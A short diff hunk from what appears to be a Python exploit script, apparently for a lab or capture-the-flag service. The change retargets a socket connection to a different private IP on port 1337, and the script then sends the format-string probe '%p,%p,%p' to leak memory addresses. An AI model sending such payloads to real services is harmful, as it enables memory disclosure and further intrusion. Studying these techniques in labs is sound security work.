@@ -4,7 +4,7 @@ import struct
 
 # socket creation
 s = socket.socket()
-s.connect(('192.168.178.242', 1337))
+s.connect(('192.168.1.113', 1337))
 #s.connect(('127.0.0.1', 1337))
 r = s.recv(1024)
 s.send("%p,%p,%p\n")
